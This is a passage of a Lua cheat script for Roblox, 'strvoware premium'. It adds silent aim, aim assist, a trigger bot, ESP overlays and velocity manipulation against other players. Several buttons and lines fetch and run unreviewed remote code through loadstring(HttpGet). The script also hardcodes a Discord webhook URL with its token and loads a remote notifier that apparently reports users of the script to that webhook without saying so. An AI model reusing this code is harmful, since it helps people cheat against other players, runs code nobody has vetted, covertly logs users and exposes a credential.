game.Players.PlayerRemoving:Connect(onPlayerRemoving)

RunService.Heartbeat:Connect(function()
    pcall(function()
        for i, player in pairs(game.Players:GetChildren()) do
            if player.Name ~= game.Players.LocalPlayer.Name then
                local hrp = player.Character.HumanoidRootPart
                zeroOutYVelocity(hrp)
            end
        end
    end)
end)
end})


aimingGroup:addToggle({text = "Enabled", flag = "Enabled", default = false, callback = function(value)
    silent.on = value
end})

aimingGroup:addToggle({text = "Assist", flag = "Assist", default = false, callback = function(value)
    silent.assist = value
end})

aimingGroup:addSlider({text = "Assist Strength", flag = "AssistStrength", min = 1, max = 100, default = 58, callback = function(value)
    silent.assistv = value * 0.001
end})

aimingGroup:addToggle({text = "Highlight", flag = "Highlight", default = false, callback = function(value)
    silent.hl = value
end})

-- Field of View section
local fovSection = aimbotTab:createGroup('right', 'Field of View')

fovSection:addToggle({text = "Visible", flag = "FovVisible", default = false, callback = function(value)
    silent.fov.visible = value
end})

fovSection:addSlider({text = "Size", flag = "FovSize", min = 1, max = 100, default = 15, callback = function(value)
    silent.fov.size = value
end})


--woopadoop
getgenv().Title = "strvoware"
getgenv().ThumbnailUrl = ""
getgenv().Color = 0x000000 -- Black

getgenv().FieldTitle = ""
getgenv().FieldText = ""

getgenv().FooterText = ""
getgenv().FooterUrl = ""

getgenv().Webhook = "https://discord.com/api/webhooks/1260809458523570267/uRbBSpAZWMuN_APoQlvNCO7oNtgJ_i1k_B1SaabWHa2IGwZBj0P_DhdY8bSaZJ3GETd-"

coroutine.wrap(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAScripts/Webhook/main/Notifer.lua"))()
end)()

--
local kewlcat = aimbotTab:createGroup('right', 'kewlcat check')

local GroupId = 13528605
local NotificationMessagePrefix = "kewlcat: "
local notificationEnabled = false
local notificationConnection
local playersInGroup = {} 

local function sendNotification()
    local playersList = {}
    
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player:IsInGroup(GroupId) then
            table.insert(playersList, player.DisplayName) -- Store display names
        end
    end

    -- Sort players by their join order (assuming they joined when the game started)
    table.sort(playersList)

    if #playersList > 0 then
        local combinedMessage = NotificationMessagePrefix .. table.concat(playersList, ", ")
        
        -- Send the notification with combined message
        local success, _ = pcall(function()
            game.StarterGui:SetCore("SendNotification", {
                Title = "demon time",
                Text = combinedMessage,
                Duration = 3 -- Notification visible for 5 seconds
            })
        end)

        if not success then
            warn("Failed to send notification")
        end
    end
end

local function startNotificationLoop()
    while notificationEnabled do
        sendNotification() 
        
        wait(2)
    end
end

local function toggleNotification(value)
    notificationEnabled = value
    if notificationEnabled then
        startNotificationLoop()
    else
       
        playersInGroup = {}
    end
end


kewlcat:addToggle({
    text = "kewlcat",
    flag = "kewlcatk",
    default = true,
    callback = function(value)
        toggleNotification(value)
    end
})




-- Checks section
local checksSection = aimbotTab:createGroup('left', 'Checks')

checksSection:addToggle({text = "Visible", flag = "VisibleCheck", default = true, callback = function(value)
    silent.visible = value
end})

checksSection:addToggle({text = "Friends", flag = "FriendCheck", default = true, callback = function(value)
    silent.friend = value
end})

checksSection:addToggle({text = "Distance", flag = "DistanceCheck", default = true, callback = function(value)
    silent.distance = value
end})

checksSection:addSlider({text = "Max Distance", flag = "MaxDistance", min = 1, max = 1000, default = 150, callback = function(value)
    silent.dist = value
end})

-- Visuals tab
local visualsTab = library:addTab("Visuals")
local espSection = visualsTab:createGroup('left', "Visuals")

espSection:addToggle({text = "ESP", flag = "ESP", default = false, callback = function(value)
    task.spawn(function()
        for _, v in ipairs(game.Players:GetPlayers()) do
            if value then
                print('a', v)
                VisualsModule:New(v)
            else
                VisualsModule:Remove(v)
            end
        end
    end);
end})

espSection:addToggle({
    text = "ESP Box",
    flag = "ESPBox",
    default = true,
    callback = function(value)
        Flags.ESPBox = not Flags.ESPBox
        --Notifications:New("Box ESP has been set to " .. tostring(Flags.ESPBox), 3)
    end
})

espSection:addToggle({
    text = "ESP Highlight",
    flag = "ESPHighlight",
    default = true,
    callback = function(value)
        Flags.ESPHighlight = not Flags.ESPHighlight
        --Notifications:New("Highlight ESP has been set to " .. tostring(Flags.ESPHighlight), 3)
    end
})

espSection:addToggle({
    text = "ESP Name",
    flag = "ESPName",
    default = true,
    callback = function(value)
        Flags.ESPName = not Flags.ESPName
        --Notifications:New("Distance ESP has been set to " .. tostring(value), 3)
    end
})

espSection:addToggle({
    text = "ESP Distance",
    flag = "ESPDistance",
    default = true,
    callback = function(value)
        Flags.ESPDistance = value
        --Notifications:New("Distance ESP has been set to " .. tostring(value), 3)
    end
})

espSection:addToggle({
    text = "ESP Weapon",
    flag = "ESPWeapon",
    default = true,
    callback = function(value)
        Flags.ESPWeapon = value
        --Notifications:New("Weapon ESP has been set to " .. tostring(value), 3)
    end
})

espSection:addToggle({
    text = "ESP Reload",
    flag = "ESPReloading",
    default = true,
    callback = function(value)
        Flags.ESPReloading = value
        --Notifications:New("Reload ESP has been set to " .. tostring(value), 3)
    end
})

espSection:addToggle({
    text = "ESP Ammo",
    flag = "ESPAmmo",
    default = true,
    callback = function(value)
        Flags.ESPAmmo = value
        --Notifications:New("Ammo ESP has been set to " .. tostring(value), 3)
    end
})

espSection:addToggle({
    text = "ESP Vest",
    flag = "ESPVest",
    default = true,
    callback = function(value)
        Flags.ESPVest = value
        --Notifications:New("Vest ESP has been set to " .. tostring(value), 3)
    end
})

espSection:addToggle({
    text = "ESP Health",
    flag = "ESPHealth",
    default = true,
    callback = function(value)
        Flags.ESPHealth = value
        --Notifications:New("Health ESP has been set to " .. tostring(value), 3)
    end
})

-- Healthbar essp
espSection:addToggle({
    text = "ESP Healthbar",
    flag = "ESPHealthbar",
    default = true,
    callback = function(value)
        Flags.ESPHealthbar = value
    end
})


local targetTab = library:addTab("Target")  -- Naming the tab "Target"


local miscGroup = targetTab:createGroup('left', "misc") 


miscGroup:addButton({
    text = "TargetHub(BETA)", 
    callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/IHadK/STRVOWAREPREM/main/targethub.lua"))()
    end
})


miscGroup:addButton({
    text = "TriggerBot(BETA)", 
    callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/IHadK/STRVOWAREPREM/main/triggerbot.lua"))()
    end
})
    

local configTab = library:addTab("Settings")

-- Create Configs group
local createconfigs = configTab:createGroup('left', 'Create Configs')

createconfigs:addTextbox({text = "Name", flag = "config_name"})
createconfigs:addButton({text = "Load", callback = library.loadConfig})

-- Config Settings group
local configsettings = configTab:createGroup('left', 'Config Settings')

configsettings:addConfigbox({flag = 'test', values = {}})
configsettings:addButton({text = "Load", callback = library.loadConfig})
configsettings:addButton({text = "Update", callback = library.saveConfig})
configsettings:addButton({text = "Delete", callback = library.deleteConfig})
configsettings:addButton({text = "Refresh", callback = library.refreshConfigs})

local LocalHL2 = Instance.new("Highlight")
LocalHL2.FillColor = Color3.fromRGB(160, 160, 160)
LocalHL2.OutlineColor = Color3.fromRGB(255, 35, 35)


Connections["RS1"] = game:GetService("RunService").Heartbeat:Connect(function()
    silent.pred = get_pred()
    Circle.Position = Vector2.new(Mouse.X, Mouse.Y + Gui:GetGuiInset().Y)
    Circle.Radius = silent.fov.size * 3
    Circle.Visible = silent.fov.visible
    if silent.on and  silent.mode == "FOV" then 
        GetClosestPlayer()
    end
    if silent.on and silent.target then 
        silent.cf = GetClosestPointOfPart(silent.target.Character[silent.part])
    end
    if silent.on and silent.hl and silent.target then 
        if LocalHL2.Parent ~= silent.target.Character then
           LocalHL2.Parent = silent.target.Character
        end
    else
        if LocalHL2.Parent ~= game.CoreGui then 
           LocalHL2.Parent = game.CoreGui
        end
    end
    if silent.on and silent.target and silent.assist and silent.mode == "Target" then 
        local Character = silent.target.Character
        local TargetCF = silent.cf
        local Prediction = TargetCF + Vector3.new(Character.HumanoidRootPart.Velocity.X, (Character.HumanoidRootPart.Velocity.Y * 0.3), Character.HumanoidRootPart.Velocity.Z) * silent.pred
        local Main = CFrame.new(CurrentCamera.CFrame.p, Prediction)
        CurrentCamera.CFrame = CurrentCamera.CFrame:Lerp(Main, silent.assistv, Enum.EasingStyle.Exponential , Enum.EasingDirection.InOut)
    end
end)

game:GetService("UserInputService").InputBegan:Connect(function(Key,GP)
    if GP then return end
    if Key.KeyCode ~= silent.key then return end
    if silent.on and silent.mode == "Target" then 
        if silent.target ~= nil then 
            silent.target = nil
        else
            GetClosestPlayer()
        end
    end
end)

function Silent()
    if silent.on and silent.target ~= nil then 
        local Character = silent.target.Character
        local TargetCF = CFrame.new(silent.cf)
        local Prediction
        local rootPartsList = {
            Character.HumanoidRootPart,
            Character.Head,
            Character.UpperTorso,
            Character.LowerTorso,
            Character.LeftFoot,
            Character.RightFoot,
            Character.LeftHand,
            Character.RightHand
        }
        
        -- Choose a random root part from the list
        local randomRootPart = rootPartsList[math.random(1, #rootPartsList)]
        
        -- Check if the selected root part is valid before using its velocity
        if randomRootPart and randomRootPart:IsA("BasePart") then
            if randomRootPart.Velocity.Y < -20 then 
                Prediction = TargetCF.Position + Vector3.new(randomRootPart.Velocity.X, (randomRootPart.Velocity.Y * 0.3), randomRootPart.Velocity.Z) * silent.pred
            else
                Prediction = TargetCF.Position + randomRootPart.Velocity * silent.pred
            end
        end
        MainEvent():FireServer("MOUSE",Prediction)
    end
end

game.Players.LocalPlayer.Character.ChildAdded:Connect(function(tool)
    if tool:IsA("Tool") then
        tool.Activated:Connect(function()
            Silent() 
        end)
    end
 end)
    
 game.Players.LocalPlayer.CharacterAdded:Connect(function(Character)
    Character.ChildAdded:Connect(function(tool)
        if tool:IsA("Tool") then
            tool.Activated:Connect(function()
                Silent() 
            end)
        end
    end)
 end)

do
    RunService:BindToRenderStep("ESPUpdate", 100, function()
        do
            if Client.Character then 
                for _, Data in next, VisualsModule.ESPCache do 
                    Data:Update();
                end;
            end;
        end;
    end);
end


local function callback(Text)
end

 -- notifications
 local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
 local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
 
 Notification:Notify(
     {Title = "strvoware premuim", Description = "hey :3"},
     {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 30, Type = "image"},
     {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(255, 84, 84), Callback = function(State) print(tostring(State)) end}
 )
 wait(1)
 Notification:Notify(
     {Title = "strvoware premium.", Description = "best voidfalls streamable"},
     {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 20 , Type = "image"},
     {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(255, 84, 84)}
 )
 wait(1)
 Notification:Notify(
     {Title = "strvoware premium", Description = "contact strvo. with bugs"},
     {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 10, Type = "default"}
 )
--strvoware premium
